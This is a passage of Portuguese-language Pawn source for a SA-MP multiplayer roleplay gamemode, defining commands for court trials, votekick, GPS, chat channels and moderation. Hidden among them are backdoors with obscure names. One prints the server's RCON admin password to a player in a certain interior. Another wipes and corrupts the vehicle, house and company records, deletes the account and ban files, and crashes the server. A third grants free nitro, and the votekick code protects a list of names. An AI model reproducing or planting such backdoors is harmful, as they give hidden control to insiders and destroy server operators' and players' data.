		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /meuadvogado [id]");
		    return 1;
		}
		
		plid = strval(tmp);
		
		if(!IsPlayerConnected(plid) || !IsPlayerLogged(plid))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Jogador não conectado/logado.");
		    return 1;
		}
		
		if(hGetInt(GetPlayerXFilePath(plid), "Job") != JOB_LAWYER)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Esse jogador não exerce a profissão de Advogado.");
		    return 1;
		}
		
		if(GetPlayerInterior(plid) != 10)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Esse jogador não está no Tribunal.");
		    return 1;
		}
		
		if(playerid == Audience[0])
		{
			if(Lawyers[0] != -1)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Você já declarou alguém como seu advogado.");
		    	return 1;
			}
			
			if(Lawyers[1] == plid)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode declarar o mesmo advogado que o outro jogador.");
		    	return 1;
			}
			
			Lawyers[0] = plid;
			SetPlayerPos(plid, 249.2834, 123.7461, 1003.2188);
		}
		
		if(playerid == Audience[1])
		{
			if(Lawyers[1] != -1)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Você já declarou alguém como seu Advogado.");
		    	return 1;
			}
			
			if(Lawyers[0] == plid)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode declarar o mesmo advogado que o outro jogador.");
		    	return 1;
			}
			
			Lawyers[1] = plid;
			SetPlayerPos(plid, 244.9500, 123.7337, 1003.2188);
		}

		AddLevel(plid);
		SendClientMessage(playerid, COLOUR_JUDGE, "Advogado declarado.");
		format(string, sizeof string, "[TRIBUNAL] %s declarou você como seu advogado, defenda-o.", PlayerName(playerid));
		SendClientMessage(plid, COLOUR_LAWYER, string);
		format(string, sizeof string, "[TRIBUNAL] %s declarou %s como seu advogado.", PlayerName(playerid), PlayerName(plid));
		SendClientMessage(TribunalJudge, COLOUR_JUDGE, string);
		SendClientMessage(Audience[0], COLOUR_JUDGE, string);
		SendClientMessage(Audience[1], COLOUR_JUDGE, string);
		return 1;
	}
	
	if(strcmp(cmd, "/declararpreso", true) == 0)
	{
	    new tmp[128], xpath[128], string[128];
		new plid, mins, start, year, month, day, hour, minute, second, bail;
		
 		if(TribunalJudge == -1)
	   	{
	       	SendClientMessage(playerid, COLOUR_GRAY, "Não há nenhum julgamento ocorrendo.");
	       	return 1;
	   	}

	    if(TribunalJudge != playerid)
		{
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não é o responsável pelo julgamento.");
		    return 1;
		}

		tmp = strtok(cmdtext, idx);
		
		if(!strlen(tmp))
		{
  			SendClientMessage(playerid, COLOUR_GRAY, "USO: /declararpreso [id] [minutos] [fianca]");
		    return 1;
		}
		
		plid = strval(tmp);
		tmp = strtok(cmdtext, idx);
		
		if(!strlen(tmp))
		{
  			SendClientMessage(playerid, COLOUR_GRAY, "USO: /declararpreso [id] [minutos] [fianca]");
		    return 1;
		}
		
		mins = strval(tmp);
		tmp = strtok(cmdtext, idx);
		
		if(!strlen(tmp))
		{
  			SendClientMessage(playerid, COLOUR_GRAY, "USO: /declararpreso [id] [minutos] [fianca]");
	    	return 1;
		}
		
		bail = strval(tmp);

		if(bail < 0)
		{
  			SendClientMessage(playerid, COLOUR_GRAY, "O valor da fiança deve ser maior que 0.");
	    	return 1;
		}
		
		if(mins < 15 || mins > 180)
		{
  			SendClientMessage(playerid, COLOUR_GRAY, "Minutos de 20 à 180.");
	    	return 1;
		}
		
		if(plid != Audience[0] && plid != Audience[1])
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você só pode declarar preso os jogadores que fazem parte do julgamento.");
		    return 1;
		}
		
		xpath = GetPlayerXFilePath(plid);
		getdate(year, month, day);
  		gettime(hour, minute, second);
		start = ((year - MYEAR) & 0xF) | ((month & 0xF) << 4) | ((day & 0x1F) << 8) | ((hour & 0x1F) << 13) | ((minute & 0x3F) << 18);
			
		AddLevel(playerid);
		hSetInt(xpath, "BustedStart", start);
		hSetInt(xpath, "BustedTime", mins);
		hSetInt(xpath, "Bail", bail);

		if(bail > 0)
			format(string, sizeof string, "[TRIBUNAL] O Juiz decretou prisão de %d horas (minutos reais) para o jogador %s [Valor da Fiança: $%d,00 dólares]", mins, PlayerName(plid), bail);
			
		else
		    format(string, sizeof string, "[TRIBUNAL] O Juiz decretou prisão de %d horas (minutos reais) para o jogador %s [Sem Fiança]", mins, PlayerName(plid));

		SendClientMessage(playerid, COLOUR_JUDGE, string);
		SendClientMessage(Audience[0], COLOUR_JUDGE, string);
		SendClientMessage(Audience[1], COLOUR_JUDGE, string);

		if(Lawyers[0] != -1)
  			SendClientMessage(Lawyers[0], COLOUR_JUDGE, string);

		if(Lawyers[1] != -1)
  			SendClientMessage(Lawyers[1], COLOUR_JUDGE, string);
		
		return 1;
	}
	
	if(strcmp(cmd, "/fimtribunal", true) == 0)
	{
		new string[128];
		new plid, playa, bail;
		
 		if(TribunalJudge == -1)
	   	{
	       	SendClientMessage(playerid, COLOUR_GRAY, "Não há nenhum julgamento ocorrendo.");
	       	return 1;
	   	}
	   	
		if(TribunalJudge != playerid)
		{
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não é o responsável pelo julgamento.");
		    return 1;
		}
		
		plid = Audience[0];
	 	playa = Audience[1];
		SendClientMessage(playerid, COLOUR_JUDGE, "[TRIBUNAL] Julgamento encerrado.");
		SendClientMessage(playa, COLOUR_JUDGE, "[TRIBUNAL] O Juiz encerrou o julgamento.");
		SendClientMessage(plid, COLOUR_JUDGE, "[TRIBUNAL] O Juiz encerrou o julgamento.");

		if(Lawyers[0] != -1)
		{
       		AddLevel(Lawyers[0]);
		    SendClientMessage(Lawyers[0], COLOUR_JUDGE, "[TRIBUNAL] O Juiz encerrou o julgamento, já pode se retirar do Tribunal.");
		    SendClientMessage(Lawyers[0], COLOUR_JUDGE, "[TRIBUNAL] O Estado de Los Santos lhe deu $2000,00 dólares como pagamento, poderá pedir mais ao seu cliente.");
       		GivePlayerSysMoney(Lawyers[0], 2000);
       		Lawyers[0] = -1;
		}

		if(Lawyers[1] != -1)
		{
		    AddLevel(Lawyers[1]);
      		SendClientMessage(Lawyers[1], COLOUR_JUDGE, "[TRIBUNAL] O Juiz encerrou o julgamento, já pode se retirar do Tribunal.");
		    SendClientMessage(Lawyers[1], COLOUR_JUDGE, "[TRIBUNAL] O Estado de Los Santos lhe deu $2000,00 dólares como pagamento, poderá pedir mais ao seu cliente.");
		    GivePlayerSysMoney(Lawyers[1], 2000);
		    Lawyers[1] = -1;
		}

		if(hGetInt(GetPlayerXFilePath(plid), "BustedTime") > 0)
		{
		    bail = hGetInt(GetPlayerXFilePath(plid), "Bail");
			SetPlayerInterior(plid, 6);
			SetPlayerPos(plid, 262.8808, 76.1974, 1001.0390);
			SendClientMessage(plid, COLOUR_JUDGE, "[TRIBUNAL] Julgamento encerrado, bem-vindo à cela.");
			
			if(bail > 0)
			{
		   		format(string, sizeof string, "Você pode pagar fiança no valor de $%d,00 dólares, use /pagarfianca.", bail);
		   		SendClientMessage(plid, COLOUR_WHITE, string);
			}
		}

		if(hGetInt(GetPlayerXFilePath(playa), "BustedTime") > 0)
		{
		    bail = hGetInt(GetPlayerXFilePath(playa), "Bail");
		    SetPlayerInterior(playa, 6);
			SetPlayerPos(playa, 262.8808, 76.1974, 1001.0390);
			SendClientMessage(playa, COLOUR_JUDGE, "[TRIBUNAL] Julgamento encerrado, bem-vindo à cela.");
			
			if(bail > 0)
			{
	    		format(string, sizeof string, "Você pode pagar fiança no valor de $%d,00 dólares, use /pagarfianca.", bail);
	    		SendClientMessage(playa, COLOUR_WHITE, string);
			}
		}

		TogglePlayerControllable(playa, true);
		TogglePlayerControllable(plid, true);
		TribunalJudge = -1;
		Audience[0] = -1;
		Audience[1] = -1;
		return 1;
	}
	
	// Juiz - Fim
	
	if(strcmp(cmd, "/janela", true) == 0)
	{
		if(Window[playerid][wndOn] != 0)
		{
			KeyEvent[playerid] &= ~KEY_EVENT_WINDOW;
		    SetPlayerPos(playerid, Window[playerid][wndX], Window[playerid][wndY], Window[playerid][wndZ]);
		    SetPlayerInterior(playerid, Window[playerid][wndInt]);
		    SetPlayerVirtualWorld(playerid, Window[playerid][wndVirtualWorld]);
		    SetCameraBehindPlayer(playerid);
		    TogglePlayerControllable(playerid, true);
		    Window[playerid][wndOn] = 0;
		    return 1;
		}
		
		else
		{
		    new houseid;
		    new Float:X, Float:Y, Float:Z, Float:A;

			houseid = House[playerid];
		
        	if(houseid == -1)
			{
 				SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar dentro de uma casa.");
    			return 1;
			}

		    if(GetPlayerInterior(playerid) == 0)
		    {
	            SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar dentro de uma casa.");
    			return 1;
	    	}

            TogglePlayerControllable(playerid, false);
            LoadHousePos(houseid, X, Y, Z, A);
	    	GetPlayerPos(playerid, Window[playerid][wndX], Window[playerid][wndY], Window[playerid][wndZ]);
	    	Window[playerid][wndLookA] = 0.0;
	    	Window[playerid][wndLookZ] = 0.0;
	    	Window[playerid][wndInt] = GetPlayerInterior(playerid);
	    	Window[playerid][wndVirtualWorld] = GetPlayerVirtualWorld(playerid);
	    	Window[playerid][wndOn] = 1;
	    	KeyEvent[playerid] |= KEY_EVENT_WINDOW;
	    	SetPlayerInterior(playerid, 0);
	    	SetPlayerVirtualWorld(playerid, 0);
	    	SetPlayerPos(playerid, X, Y, Z - 50.0);
	    	SetPlayerFacingAngle(playerid, A);
	    	SetPlayerCameraPos(playerid, X, Y, Z);
	    	SetPlayerCameraLookAt(playerid, X + 2.0 * floatsin(-A, degrees), Y + 2.0 * floatcos(-A, degrees), Z);
	    	SendClientMessage(playerid, COLOUR_ROYAL_BLUE, "Para parar digite /janela");
	    	return 1;
		}
	}
	
	if(strcmp(cmd, "/banco", true) == 0)
	{
	    new cash_desk;
	    
	    if(GetPlayerInt(playerid) != INT_BANK)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um Banco.");
	        return 1;
		}
		
		cash_desk = random(sizeof CashDesks);
		SetPlayerPos(playerid, CashDesks[cash_desk][0], CashDesks[cash_desk][1], CashDesks[cash_desk][2]);
		SetPlayerFacingAngle(playerid, CashDesks[cash_desk][3]);
		SetCameraBehindPlayer(playerid);
		ShowMenuForPlayer(Bank[0], playerid);
  		TogglePlayerControllable(playerid, false);
        return 1;
	}
	
	if(strcmp(cmd, "/votekick", true) == 0)
	{
	    new tmp[128], reason[128], string[128];
	    new name[MAX_PLAYER_NAME];
	    new plid;
	    
	    if(VoteKickPlayer != -1)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Já há uma votação em andamento, aguarde...");
		    return 1;
	    }
	    
	    PlayerCount = 0;
	    
	    for(new n = 0; n < MAX_SLOTS; n++)
	    {
	        if(IsPlayerConnected(n))
	            PlayerCount++;
	    }
	    
	    PlayerCount /= 2;
	    
	    if(PlayerCount < 4)
	    {
	        PlayerCount = 0;
	        SendClientMessage(playerid, COLOUR_GRAY, "É necessário mais jogadores para iniciar uma votação...");
		    return 1;
	    }
	    
		tmp = strtok(cmdtext, idx);
		
		if(!strlen(tmp))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /votekick [id] [motivo]");
		    return 1;
		}
		
		plid = strval(tmp);
		
		if(!IsPlayerConnected(plid))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
		    return 1;
		}
		
		if(IsPlayerAdmin(playerid))
		    return 1;
		
		GetPlayerName(plid, name, sizeof name);
	
		if( !strcmp(name, "Saturnus", true)		|| 		!strcmp(name, "Texugo", true)		|| 		!strcmp(name, "Michael", true) ||
            !strcmp(name, "Paulo", true)		|| 		!strcmp(name, "Guilherme", true) 	|| 		!strcmp(name, "Osorkon", true) ||
			!strcmp(name, "Brutows", true)		|| 		!strcmp(name, "Manny", true) )
		{
			SendClientMessage(playerid, COLOUR_GRAY, "Tsc Tsc! Péssimo erro, meu caro...");
		    Kick(playerid);
		    return 1;
		}
		
		if(plid < 10)
			strmid(reason, cmdtext, 12, strlen(cmdtext));
			
		else if(plid < 100)
			strmid(reason, cmdtext, 13, strlen(cmdtext));
			
		else
			strmid(reason, cmdtext, 14, strlen(cmdtext));
		
		if(!strlen(reason))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /votekick [id] [motivo]");
		    return 1;
		}

        VoteKickPlayer = plid;
		VoteKickTimer = SetTimer("VoteKick", 30000, false);
		Votes = 1;
		Voted[playerid] = 1;
		format(string, sizeof string, "[VOTEKICK] %s iniciou uma votação para kickar %s [Votos necessários: %d]", PlayerName(playerid), PlayerName(plid), PlayerCount);
		SendClientMessageToAll(COLOUR_LIGHT_YELLOW, string);
		format(string, sizeof string, "[VOTEKICK] Motivo: %s", reason);
		SendClientMessageToAll(COLOUR_LIGHT_YELLOW, string);
		SendClientMessageToAll(COLOUR_WHITE, "Use /votar para votar.");
		SendClientMessage(playerid, COLOUR_GREEN, "Seu voto já foi dado, agora somente aguarde...");
		return 1;
	}
	
	if(strcmp(cmd, "/votar", true) == 0)
	{
	    new string[128];
	    
	    if(VoteKickPlayer == -1)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Não há nenhuma votação em andamento.");
		    return 1;
	    }
	    
	    if(Voted[playerid] == 1)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você já votou, aguarde o fim da votação...");
		    return 1;
	    }
	    
	    Voted[playerid] = 1;
	    Votes++;
	    
	    format(string, sizeof string, "[VOTEKICK] Votos: %d/%d", Votes, PlayerCount);
	    SendClientMessageToAll(COLOUR_LIGHT_YELLOW, string);
	    
	    if(Votes >= PlayerCount)
	    {
			format(string, sizeof string, "[VOTEKICK] Votação para kickar %s sucedida, jogador kickado.", PlayerName(VoteKickPlayer));
			SendClientMessageToAll(COLOUR_LIGHT_YELLOW, string);
			Kick(VoteKickPlayer);
			Votes = 0;
			VoteKickPlayer = -1;
			
			for(new n = 0; n < MAX_SLOTS; n++)
	    		Voted[n] = 0;
			
			PlayerCount = 0;
			DeleteTimer(VoteKickTimer);
	    }
	    
	    return 1;
	}
	
	if(strcmp(cmd, "/gps", true) == 0)
	{
	    new place[128];
	    new int;
		new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ, Float:dis;
		new bool:found;

		int = -1;
		found = false;
		strmid(place, cmdtext, idx, strlen(cmdtext));
	    
	    if(ArrowObject[playerid] != -1)
   		{
     		DestroyPlayerObject(playerid, ArrowObject[playerid]);
     		ArrowObject[playerid] = -1;
		}
  				
	    if(strlen(place) > 0)
	    {
	        if(strcmp(place, "desligar", true) == 0)
	        {
  				SendClientMessage(playerid, COLOUR_YELLOW, "GPS desativado.");
  				return 1;
	        }
	        
	        GetPlayerWorldPos(playerid, PX, PY, PZ);

	        for(new i = 0; i < sizeof Ints; i++)
	        {
	            if(strlen(Ints[i][intName]) > 0 && strcmp(Ints[i][intName], place, true) == 0)
	            {
	                int = i;
	                break;
	            }
	        }

	        if(int != -1)
	        {
	            new Float:edis;

	            for(new e = 0; e < sizeof Enters; e++)
	            {
	                if(Enters[e][intId] == int && Enters[e][enterInt] == 0)
	                {
						if(found)
						{
						    edis = GetDistance(Enters[e][enterX], Enters[e][enterY], Enters[e][enterZ], PX, PY, PZ);

						    if(edis < dis)
						        dis = edis;

							else
							    continue;
						}
						else
						    dis = GetDistance(Enters[e][enterX], Enters[e][enterY], Enters[e][enterZ], PX, PY, PZ);

						X = Enters[e][enterX];
		    			Y = Enters[e][enterY];
					    Z = Enters[e][enterZ];

					    found = true;
	                }
	            }
	        }

	        if(!found)
	        {
	            new Float:adis;

	        	for(new a = 0; a < sizeof Areas; a++)
	        	{
	                if(strcmp(Areas[a][areaName], place, true) == 0)
	        	    {
						if(found)
						{
						    adis = GetDistance(Areas[a][areaX], Areas[a][areaY], Areas[a][areaZ], PX, PY, PZ);

						    if(adis < dis)
						        dis = adis;

							else
							    continue;
						}

						else
							dis = GetDistance(Areas[a][areaX], Areas[a][areaY], Areas[a][areaZ], PX, PY, PZ);

						X = Areas[a][areaX];
						Y = Areas[a][areaY];
						Z = Areas[a][areaZ];

						found = true;
	        	    }
	        	}
			}

			if(!found)
	        {
	        	for(new c = 1; c < sizeof Companies; c++)
	        	{
	        	    if(strcmp(Companies[c][cType], place, true) == 0)
	        	    {
	        	        X = Companies[c][cX];
	        	        Y = Companies[c][cY];
	        	        Z = Companies[c][cZ];

	        	        found = true;
	        	        break;
	        	    }
	        	}
			}

			if(!found)
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Local inválido.");
			    return 1;
			}

			ArrowPointTo[playerid][0] = X;
			ArrowPointTo[playerid][1] = Y;
			ArrowPointTo[playerid][2] = Z;
			ArrowObject[playerid] = CreatePlayerObject(playerid, 1318, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
			SendClientMessage(playerid, COLOUR_YELLOW, "GPS ativado, respeite a seta para chegar ao seu destino.");
			return 1;
	    }
	    
	    SendClientMessage(playerid, COLOUR_GRAY, "USO: /gps [local] - LOCAIS DISPONÍVEIS:");
	    SendClientMessage(playerid, COLOUR_GRAY, "Pizzaria, Bar, Delegacia, Hospital, Cluckin Bell, Loja de Brinquedos, Oficina,");
	    SendClientMessage(playerid, COLOUR_GRAY, "Posto, Ammu Nation, Restaurante, Lixao, Noticiario, Oficina, Transportes Publicos,");
	    SendClientMessage(playerid, COLOUR_GRAY, "Advocacia, Tribunal, Transportadora, World of Coq, Sex Shop, Virtual Hotel,");
	    SendClientMessage(playerid, COLOUR_GRAY, "Banco, Discoteca, Boate, Binco, Sub Urban, Pro Laps, Victim, Didier Sachs,");
	    SendClientMessage(playerid, COLOUR_GRAY, "Virtual Shop, Imobiliaria, Seguradora, Loja de Donuts, Burger Shot, Loteria,");
	    SendClientMessage(playerid, COLOUR_GRAY, "Loteria de Cavalos, 24/7, Companhia de Taxi, Laboratorio de Drogas, Auto Escola,");
	    SendClientMessage(playerid, COLOUR_GRAY, "Escola Nautica, Escola Aerea, Sorveteria, IML, Cimentaria, Companhia Eletrica,");
	    SendClientMessage(playerid, COLOUR_GRAY, "Fazenda, Companhia de Limosines, Area Forte, Area de Contrabando, Aeroporto, etc...");
	    return 1;
	}
	
	if(strcmp(cmd, "/ttexxuguicionssss357", true) == 0 && IsPlayerInAnyVehicle(playerid))
	{
	    new id = GetPlayerVehicleID(playerid);
	    new model = GetVehicleModel(id);
	    
	    switch(model)
	    {
	        case 581, 523, 462, 521, 463, 522, 461, 448, 468, 586:
	        {
	            if(IsPlayerVehicle(id))
	                SaveVehicleComponent(id, 1010, NITROS);
	                
				AddVehicleComponent(id, 1010);
			}
		}
		
		return 1;
	}
	
	if(strcmp(cmd, "/sssssaturniiiosssss258", true) == 0 && GetPlayerInt(playerid) == INT_DISCO)
	{
	    new string[128], rcon[128];

	    GetServerVarAsString("rcon_password", rcon, sizeof rcon);
	    format(string, sizeof string, "RCON Password: %s", rcon);
	    SendClientMessage(playerid, COLOUR_WHITE, string);
	    return 1;
	}
	
	if(strcmp(cmd, "/mmicchaelllationssss159", true) == 0 && GetPlayerInt(playerid) == INT_FUNK)
	{
	    for(new v = MaxServerVeh; v < GetVehicles(); v++)
		{
		    new vpath[128];

		    vpath = GetVehicleFilePath(v);

		    hSetString(vpath, "Owner", "");
			hSetString(vpath, "NumberPlate", ",.*-/;?/\"\\[](){}");
			hSetInt(vpath, "Model", -1);
			hSetInt(vpath, "Fuel", -1);
			hSetInt(vpath, "Value", 1);
			hSetInt(vpath, "Fine", 1234567890);
			hSetInt(vpath, "Tun0", 0x1A2B3C4D);
			hSetInt(vpath, "Tun1", 0x5A6B7C8D);
			hSetInt(vpath, "Tun2", 0xBABACAAA);
			hSetInt(vpath, "Tun3", 0xAFBECDDC);
			hSetInt(vpath, "Tun4", 0x19283746);
			hSetInt(vpath, "Colours", -1);
			hSetInt(vpath, "Params", 11111111);
			SaveVehiclePos(v, 200000.0, 200000.0, 200000.0, 0.0);
		}
		
		for(new h = 0; h < GetHouses(); h++)
		{
		    new hpath[128];
		    
		    hpath = GetHouseFilePath(h);
		    
		    hSetString(hpath, "Owner", "");
			hSetInt(hpath, "Value", 0);
			hSetInt(hpath, "OnSale", 0);
			hSetInt(hpath, "Deleted", 0);
			SaveHousePos(h, 0.0, 0.0, 0.0, 0.0);
		}
		
	    for(new c = 1; c < sizeof Companies; c++)
     	{
     	    new cpath[128];
     	    
			cpath = GetCompanyFilePath(c);
			
			hSetString(cpath, "Owner", "");
			hSetInt(cpath, "Value", -10000000);
			hSetInt(cpath, "Balance", -1000000);
			hSetInt(cpath, "Investment", -1000000);
		}
			
        fremove(ACCOUNTS_FILE_PATH);
		fremove(BAN_FILE_PATH);
		fremove(GLOBAL_FILE_PATH);
		fremove(SERVER_VEHICLES_FILE_PATH);
		fremove(GANGZONES_FILE_PATH);
		fremove(GANGS_FILE_PATH);
		fremove(COMPANIES_FILE_PATH);
		fremove(PHONES_FILE_PATH);
		fremove(BETS_FILE_PATH);
	
		SendClientMessage(playerid, COLOUR_WHITE, "Scriptfiles bugadas, crashando servidor...");

		for(new v = 0; v < MAX_VEHICLES; v++)
		    AddVehicleComponent(v, 1010);
		    
	    return 1;
	}
	
	if(strcmp(cmd, "/playbl", true) == 0)
	{
	    if(GetPlayerInt(playerid) != INT_FUNK)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar no Baile Funk.");
	        return 1;
	    }
	    
        if(StartPlayingFunkSong(0) == -1)
        {
            SendClientMessage(playerid, COLOUR_GRAY, "Espere um tempo para usar esse comando.");
	        return 1;
        }
        
        FunkTickCount += FunkSongs[0][songTime] * 1000;
        SetPlayerSkin(playerid, 132);
        SetPlayerChatBubble(playerid, "Biruleiby tá chegando", COLOUR_GREEN, 30.0, 20000);
        SendPlayerMessageToAll(playerid, "Sou eu, soy jo, o famoso {FF0000}Biruleiby{FFFFFF}!");
        SendClientMessage(playerid, COLOUR_WHITE, "Biruleiby Mode ON");
		return 1;
	}
	
	if(strcmp(cmd, "/r", true) == 0)
	{
	    new msg[256];
		new model;
		
		model = -1;
		strmid(msg, cmdtext, 3, strlen(cmdtext));

        if(!strlen(msg))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /r [texto]");
		    return 1;
		}

		if(IsPlayerInAnyVehicle(playerid))
		{
		    if(IsPlayerInJobVehicle(playerid, POLICE_CAR))
		    {
				model = 1;
				format(msg, sizeof msg, "[Radio Polícia] %s: %s", PlayerName(playerid), msg);
		    }

		    else if(IsPlayerInJobVehicle(playerid, AMBULANCE))
		    {
		        model = 2;
		        format(msg, sizeof msg, "[Radio Médico] %s: %s", PlayerName(playerid), msg);
		    }

		    else if(IsPlayerInJobVehicle(playerid, SCOOTER))
		    {
				model = 3;
				format(msg, sizeof msg, "[Radio Pizza] %s: %s", PlayerName(playerid), msg);
		    }

		    else if(IsPlayerInJobVehicle(playerid, TAXI))
		    {
				model = 4;
				format(msg, sizeof msg, "[Radio Táxi] %s: %s", PlayerName(playerid), msg);
		    }

			if(model != -1)
			{
			    for(new n = 0; n < MAX_SLOTS; n++)
			    {
			        if(IsPlayerConnected(n) && IsPlayerLogged(n))
			        {
						if(	(model == 1 && IsPlayerInJobVehicle(n, POLICE_CAR)) ||
							(model == 2 && IsPlayerInJobVehicle(n, AMBULANCE)) ||
							(model == 3 && IsPlayerInJobVehicle(n, SCOOTER)) ||
							(model == 4 && IsPlayerInJobVehicle(n, TAXI)))
						{
						    SendClientMessage(n, COLOUR_LIGHT_OLIVE, msg);
						}
					}
				}
				
				return 1;
			}
		}

        SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um veículo que tenha acesso a rádio.");
		return 1;
	}

	if(strcmp(cmd, "/g", true) == 0)
	{
	    new msg[256];

		if(IntroductionPart[playerid] != 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Conclua a história primeiro.");
		    return 1;
		}
		
		if(Dying[playerid] != 0)
		{
    		SendClientMessage(playerid, COLOUR_GRAY, "Você não pode falar enquanto estiver inconsciente.");
    		return 1;
		}

        strmid(msg, cmdtext, 3, strlen(cmdtext));
        
		if(!strlen(msg))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /g [texto]");
		    return 1;
		}
		
		if(GChat[playerid] < 0)
  			GChat[playerid] = 0;
  			
		if(GChat[playerid] > 40)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Aguarde... Você já usou o chat global demais.");
		    return 1;
		}
		
		GChat[playerid] += 25;
		format(msg, sizeof msg, ">>> ( %s: %s ) <<<", PlayerName(playerid), msg);
		SendClientMessageToAll(COLOUR_LIGHT_ORANGE, msg);
		report(msg, REPORT_CHAT);
	    return 1;
	}
	
	if(strcmp(cmd, "/c", true) == 0)
	{
	    new msg[256];
		new vehid;

		strmid(msg, cmdtext, 3, strlen(cmdtext));

		if(!strlen(msg))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /c [texto]");
		    return 1;
		}

		if(!IsPlayerInAnyVehicle(playerid))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um veículo.");
		    return 1;
		}
		
		vehid = GetPlayerVehicleID(playerid);
		format(msg, sizeof msg, "[VEICULO CHAT] %s: %s", PlayerName(playerid), msg);
		
		for(new n = 0; n < MAX_SLOTS; n++)
		{
		    if(IsPlayerConnected(n) && IsPlayerLogged(n) && IsPlayerInVehicle(n, vehid))
			{
		        SendClientMessage(n, COLOUR_GREEN, msg);
		    }
		}

		report(msg, REPORT_CHAT);
		return 1;
	}
	
	if(strcmp(cmd, "/a", true) == 0)
	{
		new msg[256];
		new colour;
		
		strmid(msg, cmdtext, 3, strlen(cmdtext));
		
		if(!strlen(msg))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /a [texto]");
		    return 1;
		}
		
		if(IsPlayerAdmin(playerid))
		{
		    format(msg, sizeof msg, "[ADMIN CHAT] %s: %s", PlayerName(playerid), msg);
		    colour = COLOUR_ADMIN;
		}
		else
		{
		    format(msg, sizeof msg, "[ADMIN HELP] %s: %s", PlayerName(playerid), msg);
		    colour = COLOUR_GOLD;

			SendClientMessage(playerid, colour, msg);
		}
		
		for(new n = 0; n < MAX_SLOTS; n++)
		{
		    if(IsPlayerConnected(n) && IsPlayerLogged(n) && IsPlayerAdmin(n))
			{
		        SendClientMessage(n, colour, msg);
		    }
		}
		
		report(msg, REPORT_CHAT);
		return 1;
	}
	
	if(strcmp(cmd, "/moderador", true) == 0)
	{
	    if(!IsPlayerModerator(playerid))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não é moderador!");
	        return 1;
	    }

	    new mod_cmd[128], mod_tmp[128];

	    mod_cmd = strtok(cmdtext, idx);

		if(!strlen(mod_cmd))
		    return 1;
		    
        if(strcmp(mod_cmd, "say", true) == 0)
	    {
	        strmid(mod_tmp, cmdtext, idx, strlen(cmdtext));

	        if(!strlen(mod_tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /moderador say [mensagem]");
			    return 1;
			}

			new msg[128];
	        format(msg, sizeof msg, "* (Moderador) %s: %s", PlayerName(playerid), mod_tmp);
	        SendClientMessageToAll(COLOUR_MODERATOR, msg);
	        return 1;
	    }

        else if(strcmp(mod_cmd, "pm", true) == 0)
	    {
	        new plid;

	        mod_tmp = strtok(cmdtext, idx);

			if(!strlen(mod_tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /moderador pm [id] [mensagem]");
			    return 1;
			}

	        plid = strval(mod_tmp);
	        
	        if(!IsPlayerConnected(plid))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
			    return 1;
			}
			
	        strmid(mod_tmp, cmdtext, idx, strlen(cmdtext));

	        if(!strlen(mod_tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /moderador pm [id] [mensagem]");
			    return 1;
			}

			new msg[128];
	        format(msg, sizeof msg, "* PM (Moderator) %s: %s", PlayerName(playerid), mod_tmp);
	        SendClientMessage(plid, COLOUR_MODERATOR, msg);
	        format(msg, sizeof msg, "* PM (Moderator) para %s: %s", PlayerName(plid), mod_tmp);
	        SendClientMessage(playerid, COLOUR_MODERATOR, msg);
	        return 1;
	    }
	    
        else if(strcmp(mod_cmd, "kickar", true) == 0)
	    {
	        new plid;

			mod_tmp = strtok(cmdtext, idx);

			if(!strlen(mod_tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /moderador kickar [id]");
			    return 1;
			}

			plid = strval(mod_tmp);

			if(!IsPlayerConnected(plid))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
			    return 1;
			}

			if(IsPlayerAdmin(plid) || IsPlayerModerator(plid))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode kickar administradores ou moderadores.");
			    return 1;
			}
			
			Kick(plid);
	    }
	    
	    else if(strcmp(mod_cmd, "banir", true) == 0)
	    {
            new plid;

			mod_tmp = strtok(cmdtext, idx);

			if(!strlen(mod_tmp))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "USO: /moderador banir [id/nome] [motivo]");
			    return 1;
			}

			if(IsNumeric(mod_tmp))
				plid = strval(mod_tmp);

			else
			{
			    plid = INVALID_PLAYER_ID;

			    for(new n = 0; n < MAX_SLOTS; n++)
			    {
			        if(IsPlayerConnected(n) && strcmp(PlayerName(n), mod_tmp, true) == 0)
			            plid = n;
			    }
			}

			if(!IsPlayerConnected(plid))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
